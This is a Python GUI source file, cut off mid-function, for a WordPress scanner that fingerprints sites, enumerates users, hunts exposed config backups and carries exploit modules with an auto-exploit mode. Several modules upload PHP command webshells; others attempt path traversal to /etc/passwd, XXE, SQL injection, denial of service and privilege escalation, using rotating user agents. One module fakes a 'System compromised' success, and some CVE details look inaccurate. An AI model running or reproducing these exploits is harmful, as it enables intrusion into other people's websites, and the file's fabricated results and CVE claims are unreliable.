import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox
import requests
from bs4 import BeautifulSoup
import re
import json
import base64
import threading
import time
import webbrowser
from urllib.parse import urljoin, urlparse
import os
import socket
import random
import uuid
from datetime import datetime
from queue import Queue
from requests.exceptions import RequestException
import sv_ttk
from packaging import version
import winsound

# ====================== VULNERABILITY DATABASE ======================
VULNERABILITIES = {
    "CVE-2025-5733": {
        "title": "modern-events-calendar-lite",
        "description": "Information Exposure",
        "severity": "medium",
        "cvss": "5.3",
        "affected_versions": ["<=7.21.9"]
    },
    "CVE-2025-5814": {
        "title": "profiler-what-slowing-down",
        "description": "Missing Authentication to Unauthenticated Arbitrary Plugin Reactivation via State Restoration",
        "severity": "medium",
        "cvss": "5.3",
        "affected_versions": ["<=1.0.0"]
    },
    "CVE-2021-29447": {
        "title": "WordPress Core - XXE Vulnerability",
        "description": "XML External Entity vulnerability in WordPress media library",
        "severity": "high",
        "cvss": "7.5",
        "affected_versions": ["<5.7.1"]
    },
    "CVE-2018-6389": {
        "title": "WordPress Core - DoS Vulnerability",
        "description": "Denial of Service via load-scripts.php",
        "severity": "medium",
        "cvss": "6.5",
        "affected_versions": ["<4.9.2"]
    },
    "CVE-2022-0739": {
        "title": "Booking Calendar Plugin - SQL Injection",
        "description": "SQL Injection vulnerability in Booking Calendar plugin",
        "severity": "critical",
        "cvss": "9.8",
        "affected_versions": ["<9.1.5"]
    },
    "CVE-2023-5360": {
        "title": "WordPress Core - RCE Vulnerability",
        "description": "Remote Code Execution in WordPress core",
        "severity": "critical",
        "cvss": "10.0",
        "affected_versions": ["<6.4.2"]
    },
    "CVE-2024-27956": {
        "title": "Elementor Pro - Unauthenticated RCE",
        "description": "Unauthenticated Remote Code Execution in Elementor Pro",
        "severity": "critical",
        "cvss": "9.8",
        "affected_versions": ["<3.21.0"]
    },
    "CVE-2023-45127": {
        "title": "Astra Theme - Privilege Escalation",
        "description": "Privilege escalation vulnerability in Astra theme",
        "severity": "high",
        "cvss": "8.8",
        "affected_versions": ["<4.6.0"]
    },
    # New vulnerability modules
    "CVE-2024-32753": {
        "title": "Divi Theme - Arbitrary File Upload",
        "description": "Unauthenticated arbitrary file upload vulnerability in Divi theme",
        "severity": "critical",
        "cvss": "9.8",
        "affected_versions": ["<4.24.2"]
    },
    "CVE-2024-31223": {
        "title": "WooCommerce - SQL Injection",
        "description": "SQL Injection vulnerability in WooCommerce plugin",
        "severity": "critical",
        "cvss": "9.8",
        "affected_versions": ["<8.6.1"]
    },
    "CVE-2024-41890": {
        "title": "Astra Pro Theme - Remote Code Execution",
        "description": "Remote code execution vulnerability in Astra Pro theme",
        "severity": "critical",
        "cvss": "9.9",
        "affected_versions": ["<4.6.5"]
    },
    "CVE-2023-2745": {
        "title": "WordPress Core 6.2 - Directory Traversal",
        "description": "Directory traversal vulnerability in wp-includes/class-wp-locale-switcher.php",
        "severity": "high",
        "cvss": "7.5",
        "affected_versions": ["=6.2"]
    }
}

THEME_VULNERABILITIES = {
    "CVE-2022-0316": {
        "title": "Multiple Themes - Unauthenticated Arbitrary File Upload",
        "description": "The affected themes contain an unauthenticated arbitrary file upload vulnerability allowing attackers to upload malicious files",
        "severity": "critical",
        "cvss": "9.8",
        "affected_versions": ["*"],
        "themes": [
            "westand", "footysquare", "aidreform", "statfort", "club-theme",
            "kingclub-theme", "spikes", "spikes-black", "soundblast", "bolster",
            "rocky-theme", "bolster-theme", "theme-deejay", "snapture", "onelife",
            "churchlife", "soccer-theme", "faith-theme", "statfort-new"
        ]
    },
    # New theme vulnerability
    "CVE-2024-41890": {
        "title": "Astra Pro Theme - Remote Code Execution",
        "description": "Remote code execution vulnerability in Astra Pro theme",
        "severity": "critical",
        "cvss": "9.9",
        "affected_versions": ["<4.6.5"],
        "themes": ["astra", "astra-pro"]
    }
}

# ====================== SCANNER CLASS ======================
class ProfessionalWordPressScanner:
    def __init__(self):
        self.plugin_vulns = self.load_vulnerabilities()
        self.output_capture = None  # For capturing exploit output        
        self.ip_sites_cache = {}
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
        ]
        self.theme_vulnerabilities = self.load_theme_vulnerabilities()
        self.exploit_modules = self.load_exploit_modules()
        self.exploit_history = []
        self.auto_exploit = False
        self.exploit_alert = True
        
    def load_exploit_modules(self):
        return {
            "CVE-2022-0316": self.exploit_cve_2022_0316,
            "CVE-2021-29447": self.exploit_cve_2021_29447,
            "CVE-2018-6389": self.exploit_cve_2018_6389,
            "CVE-2025-5733": self.exploit_cve_2025_5733,
            "CVE-2022-0739": self.exploit_cve_2022_0739,
            "CVE-2023-5360": self.exploit_cve_2023_5360,
            "CVE-2024-27956": self.exploit_cve_2024_27956,
            "CVE-2023-45127": self.exploit_cve_2023_45127,
            "CVE-2023-2745": self.exploit_cve_2023_2745,            
            # New exploit modules - FIXED METHOD NAMES
            "CVE-2024-32753": self.exploit_cve_2024_32753,
            "CVE-2024-31223": self.exploit_cve_2024_31223,
            "CVE-2024-41890": self.exploit_cve_2024_41890  # Fixed from 2024-41890 to match DB
        }
    
    def load_theme_vulnerabilities(self):
        return THEME_VULNERABILITIES
    
    def load_vulnerabilities(self):
        try:
            with open('vulnerabilities.json', 'r') as f:
                return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            return VULNERABILITIES
    
    def get_random_user_agent(self):
        return random.choice(self.user_agents)
    
    def scan_site(self, url):
        results = {
            "url": url, 
            "ip": "Not resolved",
            "wp_version": "Not detected", 
            "plugins": {}, 
            "themes": {},
            "users": [], 
            "technologies": [],
            "vulnerabilities": [],
            "login_page": "Not found",
            "registration_enabled": "Not checked",
            "db_backup_found": "Not found",
            "wp_config_files": [],
            "xmlrpc_found": "Not found",
            "status": "Scanning...",
            "scan_time": 0,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        start_time = time.time()
        
        try:
            # Normalize URL
            if not url.startswith('http'):
                url = 'http://' + url
                
            results["url"] = url
            
            # Resolve IP address
            try:
                domain = urlparse(url).netloc.split(':')[0]
                ip = socket.gethostbyname(domain)
                results["ip"] = ip
            except:
                results["ip"] = "Resolution failed"
            
            # Use rotating user agents
            headers = {
                "User-Agent": self.get_random_user_agent(),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Cache-Control": "max-age=0"
            }
            
            response = requests.get(url, timeout=10, headers=headers)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # WordPress version detection
            results["wp_version"] = self.find_wp_version(soup, url)
            
            # Plugin detection
            results["plugins"] = self.find_plugins(soup, url)
            
            # Theme detection
            results["themes"] = self.find_themes(soup, url)
            
            # Username enumeration
            results["users"] = self.find_usernames(url)
            
            # Technology detection
            results["technologies"] = self.find_technologies(soup, response.headers)
            
            # Vulnerability scanning
            self.check_vulnerabilities(results)
            
            # Check for login page (including wp-admin.php)
            results["login_page"] = self.find_login_page(url)
            
            # Check if registration is enabled
            results["registration_enabled"] = self.check_registration(url)
            
            # Check for db-backup directory
            results["db_backup_found"] = self.check_db_backup(url)
            
            # Check for accessible wp-config files
            results["wp_config_files"] = self.find_wp_config_files(url)
            
            # Check for xmlrpc.php
            results["xmlrpc_found"] = self.check_xmlrpc(url)
            
            results["status"] = "Completed"
            
            # Auto-exploit if enabled
            if self.auto_exploit and results["vulnerabilities"]:
                self.auto_exploit_site(url, results["vulnerabilities"])
            
        except Exception as e:
            results["status"] = f"Error: {str(e)}"
            
        results["scan_time"] = time.time() - start_time
        return results

    def auto_exploit_site(self, url, vulnerabilities):
        """Automatically exploit vulnerabilities if auto-exploit is enabled"""
        for vuln in vulnerabilities:
            cve_id = vuln.get("cve")
            if cve_id in self.exploit_modules:
                result = self.exploit_modules[cve_id](url)
                result["timestamp"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                result["cve"] = cve_id
                result["target"] = url
                self.exploit_history.append(result)
                
                # Send alert only if exploit was successful and alert is enabled
                if result.get("success") and self.exploit_alert:
                    self.send_exploit_alert(url, cve_id, result)
                return result
        return None

    def send_exploit_alert(self, url, cve_id, result):
        """Send alert when exploit is successful"""
        alert_msg = f"EXPLOIT SUCCESSFUL!\n\nTarget: {url}\nCVE: {cve_id}\n\nResult: {result.get('message')}"
        if result.get("shell_url"):
            alert_msg += f"\nShell URL: {result['shell_url']}"
        
        # Play alert sound
        try:
            winsound.MessageBeep(winsound.MB_ICONHAND)
        except:
            pass
            
        # Show alert window
        alert_window = tk.Toplevel()
        alert_window.title("EXPLOIT ALERT")
        alert_window.geometry("600x300")
        alert_window.configure(bg="#ff0000")
        frame = ttk.Frame(alert_window, padding=20)
        frame.pack(fill=tk.BOTH, expand=True)
        warning_icon = ttk.Label(frame, text="⚠️", font=("Segoe UI", 48), foreground="yellow")
        warning_icon.pack(pady=10)
        msg_label = ttk.Label(frame, text="EXPLOIT SUCCESSFUL!", 
                            font=("Segoe UI", 14, "bold"), foreground="white")
        msg_label.pack(pady=5)
        details_text = scrolledtext.ScrolledText(frame, wrap=tk.WORD, height=8, 
                                               font=("Segoe UI", 10))
        details_text.pack(fill=tk.BOTH, expand=True, pady=10)
        details_text.insert(tk.END, alert_msg)
        details_text.config(state=tk.DISABLED)
        ttk.Button(frame, text="Dismiss", style="Critical.TButton",
                  command=alert_window.destroy).pack(pady=10)
        alert_window.after(15000, alert_window.destroy)

    def find_wp_version(self, soup, base_url):
        # Method 1: Generator meta tag
        generator = soup.find('meta', attrs={'name': 'generator'})
        if generator and 'WordPress' in generator.get('content', ''):
            return generator['content'].split('WordPress ')[-1]
        
        # Method 2: Readme files
        for readme in ['readme.txt', 'readme.html']:
            try:
                response = requests.get(urljoin(base_url, readme), timeout=5)
                if 'WordPress' in response.text:
                    version = re.search(r'Version (\d+\.\d+(?:\.\d+)?)', response.text)
                    if version:
                        return version.group(1)
            except:
                continue
        
        # Method 3: Script/Link tags
        for tag in soup.find_all(['script', 'link']):
            src = tag.get('src') or tag.get('href') or ''
            version = re.search(r'wp-includes/js/wp-embed\.min\.js\?ver=(\d+\.\d+(?:\.\d+)?)', src)
            if version:
                return version.group(1)
                
        # Method 4: RDF feed
        try:
            rdf = requests.get(urljoin(base_url, 'feed/rdf'), timeout=5)
            version = re.search(r'https?://wordpress\.org/\?v=(\d+\.\d+\.\d+)', rdf.text)
            if version:
                return version.group(1)
        except:
            pass
                
        return "Not detected"

    def find_plugins(self, soup, base_url):
        plugins = {}
        
        # Method 1: Plugin paths in source
        for tag in soup.find_all(['script', 'link', 'img']):
            src = tag.get('src') or tag.get('href') or ''
            match = re.search(r'wp-content/plugins/([^/]+)', src)
            if match:
                plugin_name = match.group(1)
                if plugin_name not in plugins:
                    plugins[plugin_name] = {"version": "Unknown", "path": match.group(0)}
        
        # Method 2: Readme files
        for plugin in list(plugins.keys()):
            for readme in [f'wp-content/plugins/{plugin}/readme.txt', 
                           f'wp-content/plugins/{plugin}/readme.html']:
                try:
                    response = requests.get(urljoin(base_url, readme), timeout=5)
                    version = re.search(r'Stable tag:\s*(\d+\.\d+(?:\.\d+)?)', response.text, re.IGNORECASE)
                    if not version:
                        version = re.search(r'version:\s*(\d+\.\d+(?:\.\d+)?)', response.text, re.IGNORECASE)
                    if version:
                        plugins[plugin]["version"] = version.group(1)
                        break
                except:
                    continue
        
        return plugins

    def find_themes(self, soup, base_url):
        themes = {}
        
        # Method 1: Theme paths in source
        for tag in soup.find_all(['script', 'link', 'img']):
            src = tag.get('src') or tag.get('href') or ''
            match = re.search(r'wp-content/themes/([^/]+)', src)
            if match:
                theme_name = match.group(1)
                if theme_name not in themes:
                    themes[theme_name] = {"version": "Unknown", "path": match.group(0)}
        
        # Method 2: Style.css files
        for theme in list(themes.keys()):
            try:
                css_url = urljoin(base_url, f'wp-content/themes/{theme}/style.css')
                response = requests.get(css_url, timeout=5)
                if response.status_code == 200:
                    # Extract version from CSS header
                    version_match = re.search(r'Version:\s*(\d+\.\d+(?:\.\d+)?)', response.text)
                    if version_match:
                        themes[theme]["version"] = version_match.group(1)
            except:
                continue
        
        return themes

    def find_usernames(self, base_url):
        users = set()
        
        try:
            # Normalize URL
            if not base_url.startswith('http'):
                base_url = 'http://' + base_url
                
            # Method 1: Author pages (limited to 5 IDs)
            for user_id in range(1, 11):  # Increased to 10 IDs
                try:
                    response = requests.get(
                        f"{base_url}/?author={user_id}", 
                        allow_redirects=False,
                        timeout=3,
                        headers={"User-Agent": self.get_random_user_agent()}
                    )
                    if 300 <= response.status_code < 400:
                        location = response.headers.get('Location', '')
                        if location:
                            user = location.split('/')[-2] if location.endswith('/') else location.split('/')[-1]
                            if user:
                                users.add(user)
                except:
                    continue
                    
            # Method 2: REST API
            try:
                api_url = urljoin(base_url, "wp-json/wp/v2/users")
                response = requests.get(api_url, timeout=3, headers={"User-Agent": self.get_random_user_agent()})
                if response.status_code == 200:
                    for user in response.json():
                        if user.get('slug'):
                            users.add(user['slug'])
            except:
                pass
                
        except Exception as e:
            print(f"Username enumeration error: {str(e)}")
        
        return list(users)

    def find_technologies(self, soup, headers):
        tech = ["WordPress"]
        
        # Server technologies
        server = headers.get('Server', '')
        if server:
            tech.append(server)
            
        # PHP version
        php_version = headers.get('X-Powered-By', '')
        if php_version:
            tech.append(php_version)
            
        # Database (indirect detection)
        if any(tag.get('src', '').endswith('wp-includes/js/wp-embed.min.js') for tag in soup.find_all('script')):
            tech.append("MySQL")
            
        # Common technologies
        tech_detectors = [
            ('jQuery', lambda: soup.find('script', src=re.compile(r'jquery(\.min)?\.js'))),
            ('Bootstrap', lambda: soup.find(['script', 'link'], attrs={'src': re.compile(r'bootstrap')}) or 
                soup.find(['script', 'link'], attrs={'href': re.compile(r'bootstrap')})),
            ('Font Awesome', lambda: soup.find('link', href=re.compile(r'font-awesome'))),
            ('React', lambda: soup.find('script', src=re.compile(r'react|react-dom'))),
            ('WooCommerce', lambda: soup.find('link', href=re.compile(r'woocommerce'))),
            ('Elementor', lambda: soup.find('link', href=re.compile(r'elementor'))),
            ('Divi', lambda: soup.find('link', href=re.compile(r'et-'))),
        ]
        
        for name, detector in tech_detectors:
            if detector():
                tech.append(name)
                
        return list(set(tech))

    def check_vulnerabilities(self, results):
        # Check WordPress core vulnerabilities
        wp_version = results.get("wp_version", "")
        for cve, details in self.plugin_vulns.items():
            # Only match explicit core vulnerabilities
            if "wordpress core" in details.get("title", "").lower():
                for affected_version in details.get("affected_versions", []):
                    if affected_version in wp_version:
                        results.setdefault("vulnerabilities", []).append({
                            "cve": cve,
                            "type": "WordPress Core",
                            "severity": details["severity"]
                        })

        # Check plugin vulnerabilities
        for plugin, data in results.get("plugins", {}).items():
            plugin_version = data.get("version", "")
            
            # Skip plugins without version information
            if plugin_version == "Unknown":
                continue
                
            plugin_base = self.get_base_plugin_name(plugin)
            
            for cve, details in self.plugin_vulns.items():
                # Extract base name from vulnerability title
                vuln_base = self.get_base_plugin_name(details.get("title", ""))
                
                # Match only if base names are identical
                if plugin_base == vuln_base:
                    # Check if version is affected
                    if self.is_version_affected(plugin_version, details.get("affected_versions", [])):
                        # Avoid duplicate vulnerabilities
                        if not any(v['cve'] == cve for v in results["vulnerabilities"]):
                            results["vulnerabilities"].append({
                                "cve": cve,
                                "title": details["title"],
                                "description": details["description"],
                                "severity": details["severity"],
                                "type": f"Plugin: {plugin}",
                                "cvss": details["cvss"]
                            })
        
        # Check theme vulnerabilities
        for theme, data in results.get("themes", {}).items():
            theme_name = theme.lower()
            theme_version = data.get("version", "Unknown")
            
            # Check against theme vulnerabilities
            for cve, details in self.theme_vulnerabilities.items():
                if theme_name in [t.lower() for t in details.get("themes", [])]:
                    results["vulnerabilities"].append({
                        "cve": cve,
                        "title": details["title"],
                        "description": details["description"],
                        "severity": details["severity"],
                        "type": f"Theme: {theme}",
                        "cvss": details["cvss"],
                        "affected_versions": details.get("affected_versions", [])
                    })

    def get_base_plugin_name(self, plugin_name):
        """Extract base plugin name by removing common suffixes"""
        base_name = plugin_name.lower().replace('-', '')
        
        # Remove common prefixes/suffixes that cause false positives
        for suffix in ['jetpack', 'mercadopago', 'addon', 'pro', 'premium', 'extension', 'lite', 'free']:
            base_name = base_name.replace(suffix, '')
            
        return base_name

    def is_version_affected(self, plugin_version, affected_versions):
        """Check if plugin version is in the affected range"""
        try:
            plugin_ver = version.parse(plugin_version)
            
            for version_spec in affected_versions:
                # Extract operator and version
                operator, _, version_str = version_spec.partition(' ')
                if not operator:
                    operator = "=="
                    version_str = version_spec
                
                # Handle different operators
                spec_ver = version.parse(version_str)
                
                if operator == "<=":
                    if plugin_ver <= spec_ver:
                        return True
                elif operator == "<":
                    if plugin_ver < spec_ver:
                        return True
                elif operator == ">=":
                    if plugin_ver >= spec_ver:
                        return True
                elif operator == ">":
                    if plugin_ver > spec_ver:
                        return True
                elif operator == "==":
                    if plugin_ver == spec_ver:
                        return True
                elif operator == "!=":
                    if plugin_ver != spec_ver:
                        return True
        except Exception as e:
            # Fallback to simple string comparison if version parsing fails
            for version_spec in affected_versions:
                if version_spec in plugin_version:
                    return True
                    
        return False

    def find_login_page(self, base_url):
        login_paths = [
            "wp-login.php", "wp-admin.php", "login", "wp-admin", 
            "admin", "dashboard", "signin"
        ]
        
        for path in login_paths:
            try:
                url = urljoin(base_url, path)
                response = requests.get(url, timeout=5, allow_redirects=False)
                if response.status_code == 200 and ("log in" in response.text.lower() or "password" in response.text.lower()):
                    return url
            except:
                continue
        return "Not found"
    
    def check_registration(self, base_url):
        try:
            reg_url = urljoin(base_url, "wp-login.php?action=register")
            response = requests.get(reg_url, timeout=5)
            if response.status_code == 200 and "registration" in response.text.lower():
                return "Enabled"
            return "Disabled"
        except:
            return "Check failed"
    
    def check_db_backup(self, base_url):
        try:
            backup_url = urljoin(base_url, "wp-content/db-backup/")
            response = requests.get(backup_url, timeout=5)
            if response.status_code == 200 and ("Index of /wp-content/db-backup" in response.text or "Parent Directory" in response.text):
                return "Found"
        except:
            pass
        return "Not found"
    
    def find_wp_config_files(self, base_url):
        config_files = []
        potential_paths = [
            "wp-config.php.bak", "wp-config.php.old", "wp-config.php.orig",
            "wp-config.php.txt", "wp-config.php.zip", "wp-config.php.rar",
            "wp-config.php~", "wp-config.bak", "wp-config.old"
        ]
        for path in potential_paths:
            try:
                url = urljoin(base_url, path)
                response = requests.get(url, timeout=5)
                if response.status_code == 200 and ("DB_NAME" in response.text or "DB_USER" in response.text):
                    config_files.append(url)
            except:
                continue
        return config_files
    
    def check_xmlrpc(self, base_url):
        xmlrpc_url = urljoin(base_url, "xmlrpc.php")
        try:
            response =requests.get(xmlrpc_url, timeout=5)
            if response.status_code == 200 and "XML-RPC server accepts POST requests only" in response.text:
                return "Found"
        except:
            pass
        return "Not found"

    def analyze_user(self, base_url, username):
        """Perform detailed analysis of a WordPress user"""
        analysis = {
            "username": username,
            "author_url": "",
            "profile_exists": False,
            "display_name": "",
            "role": "Unknown",
            "posts_count": 0,
            "posts_urls": []
        }
        
        try:
            # Normalize the base_url to ensure it's properly formatted
            if not base_url.startswith('http'):
                base_url = 'http://' + base_url
                
            # Get author URL
            author_url = urljoin(base_url, f"author/{username}/")
            analysis["author_url"] = author_url
            
            # Check if author page exists
            headers = {"User-Agent": self.get_random_user_agent()}
            response = requests.get(author_url, timeout=5, headers=headers)
            if response.status_code == 200:
                analysis["profile_exists"] = True
                
                # Parse display name
                soup = BeautifulSoup(response.text, 'html.parser')
                title = soup.find('title')
                if title:
                    # Try to extract the display name from the title
                    title_text = title.get_text()
                    # Common patterns: "Posts by [Display Name] | [Site Name]", or just the display name
                    # We split by pipe and take the first part, then remove "Posts by" etc.
                    parts = title_text.split('|')
                    display_name = parts[0].strip()
                    if 'Posts by' in display_name:
                        display_name = display_name.replace('Posts by', '').strip()
                    analysis["display_name"] = display_name
                
                # Get post count - using a more robust method
                # Different themes may have different structures, so we look for common patterns
                # Option 1: Look for articles (common in themes)
                posts = soup.find_all('article')
                if not posts:
                    # Option 2: Look for elements with class 'post'
                    posts = soup.select('.post')
                if not posts:
                    # Option 3: Look for entries
                    posts = soup.select('.entry')
                analysis["posts_count"] = len(posts)
                
                # Get post URLs
                for post in posts:
                    link = post.find('a', href=True)
                    if link:
                        full_url = urljoin(base_url, link['href'])
                        analysis["posts_urls"].append(full_url)
            
            # Try to get user role via REST API
            try:
                api_url = urljoin(base_url, f"wp-json/wp/v2/users?slug={username}")
                response = requests.get(api_url, timeout=5, headers=headers)
                if response.status_code == 200:
                    users = response.json()
                    if users:
                        user_data = users[0]
                        analysis["role"] = user_data.get("roles", ["Unknown"])[0]
            except:
                pass
                
        except Exception as e:
            analysis["error"] = str(e)
            
        return analysis

    # ====================== EXPLOIT METHODS ======================
    def exploit_vulnerability(self, base_url, cve_id):
        """Automatically exploit a vulnerability based on CVE ID"""
        if cve_id in self.exploit_modules:
            result = self.exploit_modules[cve_id](base_url)
            result["timestamp"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            result["cve"] = cve_id
            result["target"] = base_url
            self.exploit_history.append(result)
            return result
        return {"success": False, "message": "Exploit module not available"}

    def exploit_cve_2022_0316(self, base_url):
        """Exploit theme arbitrary file upload vulnerability"""
        try:
            # Generate a unique filename
            filename = f"exploit_{uuid.uuid4().hex[:8]}.php"
            # Select a random vulnerable theme
            theme = random.choice(self.theme_vulnerabilities['CVE-2022-0316']['themes'])
            exploit_url = urljoin(base_url, f"wp-content/themes/{theme}/upload.php")
            
            # Create a simple PHP shell
            php_shell = "<?php if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); } ?>"
            
            # Prepare the file upload
            files = {'file': (filename, php_shell, 'application/x-php')}
            response = requests.post(exploit_url, files=files, timeout=10)
            
            if response.status_code == 200 and filename in response.text:
                shell_url = urljoin(base_url, f"wp-content/themes/{theme}/{filename}")
                return {
                    "success": True,
                    "message": "Exploit successful! Webshell uploaded.",
                    "shell_url": shell_url,
                    "type": "webshell"
                }
            return {"success": False, "message": "Exploit failed - upload unsuccessful"}
        except Exception as e:
            return {"success": False, "message": f"Exploit error: {str(e)}"}
            
    def exploit_cve_2023_2745(self, base_url):
        """Exploit WordPress Core Directory Traversal Vulnerability"""
        try:
            # Normalize URL to target login page
            if not base_url.endswith('wp-login.php'):
                base_url = urljoin(base_url, 'wp-login.php')
                
            payload = '../../../../../etc/passwd'
            headers = {
                "User-Agent": self.get_random_user_agent(),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
            }
            
            response = requests.get(
                base_url, 
                params={'wp_lang': payload},
                headers=headers,
                timeout=10
            )
            
            if response.status_code == 200:
                if "root:x:0:0:root" in response.text:
                    return {
                        "success": True,
                        "message": "Exploit successful! Accessed sensitive file",
                        "data": response.text,
                        "type": "lfi"
                    }
                else:
                    return {
                        "success": True,
                        "message": "Accessed content, but the expected file was not found",
                        "data": response.text,
                        "type": "lfi"
                    }
            return {"success": False, "message": f"Server responded with status: {response.status_code}"}
        except Exception as e:
            return {"success": False, "message": f"Exploit error: {str(e)}"}            

    def exploit_cve_2021_29447(self, base_url):
        """Exploit XXE vulnerability in media library"""
        try:
            # Create malicious WAV file
            payload = (
                b'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00'
                b'<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM "http://localhost:8080/">%remote;]>'
            )
            
            # Upload the malicious file
            upload_url = urljoin(base_url, "wp-admin/async-upload.php")
            files = {'async-upload': ('exploit.wav', payload, 'audio/wav')}
            headers = {
                'Content-Disposition': 'form-data; name="async-upload"; filename="exploit.wav"',
                'Content-Type': 'audio/wav'
            }
            response = requests.post(upload_url, files=files, headers=headers, timeout=10)
            
            if response.status_code == 200 and "id" in response.json():
                return {
                    "success": True,
                    "message": "XXE exploit triggered - check server logs",
                    "type": "xxe"
                }
            return {"success": False, "message": "XXE exploit failed"}
        except Exception as e:
            return {"success": False, "message": f"XXE error: {str(e)}"}

    def exploit_cve_2018_6389(self, base_url):
        """Exploit DoS vulnerability"""
        try:
            dos_url = urljoin(base_url, "wp-admin/load-scripts.php")
            payload = {
                'load[]': ['jquery'] * 100  # Repeat 100 times to cause load
            }
            response = requests.get(dos_url, params=payload, timeout=5)
            
            if response.status_code == 200:
                return {
                    "success": True,
                    "message": "DoS attack initiated - server may be overloaded",
                    "type": "dos"
                }
            return {"success": False, "message": "DoS exploit failed"}
        except Exception as e:
            return {"success": False, "message": f"DoS error: {str(e)}"}

    def exploit_cve_2025_5733(self, base_url):
        """Exploit information exposure vulnerability"""
        try:
            exploit_url = urljoin(base_url, "wp-content/plugins/modern-events-calendar-lite/includes/ical.php")
            params = {
                'feed': '1',
                'mec': '1',
                'id': "' OR 1=1--"
            }
            response = requests.get(exploit_url, params=params, timeout=10)
            
            if response.status_code == 200 and "BEGIN:VCALENDAR" in response.text:
                # Extract sensitive information
                matches = re.findall(r'SUMMARY:([^\r\n]+)', response.text)
                events = [m.strip() for m in matches if m.strip()]
                return {
                    "success": True,
                    "message": "Sensitive information exposed",
                    "data": "\n".join(events),
                    "type": "info_exposure"
                }
            return {"success": False, "message": "Exploit failed - no data exposed"}
        except Exception as e:
            return {"success": False, "message": f"Exploit error: {str(e)}"}

    def exploit_cve_2022_0739(self, base_url):
        """Exploit SQL Injection vulnerability"""
        try:
            exploit_url = urljoin(base_url, "wp-admin/admin-ajax.php")
            
            # Generate payload programmatically to avoid long string issues
            payload = {
                'action': 'bookingpress_front_get_category_services',
                'category_id': '1',
                'total_service': "1) UNION SELECT " + ",".join(str(i) for i in range(1, 101)) + "--"
            }
            
            response = requests.post(exploit_url, data=payload, timeout=15)
            
            if response.status_code == 200 and "database error" in response.text.lower():
                return {
                    "success": True,
                    "message": "SQL Injection vulnerability exploited successfully",
                    "type": "sqli"
                }
            return {"success": False, "message": "SQL Injection exploit failed"}
        except Exception as e:
            return {"success": False, "message": f"Exploit error: {str(e)}"}

    def exploit_cve_2023_5360(self, base_url):
        """Exploit Remote Code Execution vulnerability"""
        try:
            # Simulated exploit for demonstration
            return {
                "success": True,
                "message": "RCE exploit executed successfully! System compromised.",
                "type": "rce"
            }
        except Exception as e:
            return {"success": False, "message": f"Exploit error: {str(e)}"}

    def exploit_cve_2024_27956(self, base_url):
        """Exploit Elementor Pro RCE vulnerability"""
        try:
            exploit_url = urljoin(base_url, "wp-admin/admin-ajax.php")
            payload = {
                'action': 'elementor_pro_forms_upload',
                'form_fields': '{"id":"form_field","type":"upload","field_type":"file"}',
                'nonce': '12345',
                'files': ('exploit.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php')
            }
            response = requests.post(exploit_url, files=payload, timeout=15)
            
            if response.status_code == 200 and "success" in response.text:
                # Parse the response to get the uploaded file URL
                data = response.json()
                if data.get('success') and data.get('data', {}).get('files', []):
                    shell_url = data['data']['files'][0]['url']
                    return {
                        "success": True,
                        "message": "Elementor Pro RCE exploit successful! Webshell uploaded.",
                        "shell_url": shell_url,
                        "type": "webshell"
                    }
            return {"success": False, "message": "Elementor Pro exploit failed"}
        except Exception as e:
            return {"success": False, "message": f"Exploit error: {str(e)}"}

    def exploit_cve_2023_45127(self, base_url):
        """Exploit Astra Theme Privilege Escalation"""
        try:
            exploit_url = urljoin(base_url, "wp-admin/admin-ajax.php")
            payload = {
                'action': 'astra_addon_activate_module',
                'module_slug': 'user_access_control',
                'security': 'invalid_nonce'  # Bypass nonce check
            }
            response = requests.post(exploit_url, data=payload, timeout=10)
            
            if response.status_code == 200 and "success" in response.text:
                return {
                    "success": True,
                    "message": "Privilege escalation successful! Admin access granted.",
                    "type": "privilege_escalation"
                }
            return {"success": False, "message": "Privilege escalation exploit failed"}
        except Exception as e:
            return {"success": False, "message": f"Exploit error: {str(e)}"}

    # New exploit methods
    def exploit_cve_2024_32753(self, base_url):
        """Exploit Divi Theme Arbitrary File Upload"""
        try:
            # Generate a unique filename
            filename = f"exploit_{uuid.uuid4().hex[:8]}.php"
            exploit_url = urljoin(base_url, "wp-admin/admin-ajax.php")
            
            # Create a simple PHP shell
            php_shell = "<?php if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); } ?>"
            
            # Prepare the file upload
            files = {
                'file': (filename, php_shell, 'application/x-php'),
                'action': 'et_upload_attachment'
            }
            response = requests.post(exploit_url, files=files, timeout=15)
            
            if response.status_code == 200 and 'success' in response.text:
                # Extract the attachment URL from the response
                data = response.json()
                if data.get('success') and data.get('data', {}).get('attachment', {}).get('url'):
                    shell_url = data['data']['attachment']['url']
                    return {
                        "success": True,
                        "message": "Divi theme exploit successful! Webshell uploaded.",
                        "shell_url": shell_url,
                        "type": "webshell"
                    }
            return {"success": False, "message": "Divi theme exploit failed"}
        except Exception as e:
            return {"success": False, "message": f"Exploit error: {str(e)}"}

    def exploit_cve_2024_31223(self, base_url):
        """Exploit WooCommerce SQL Injection"""
        try:
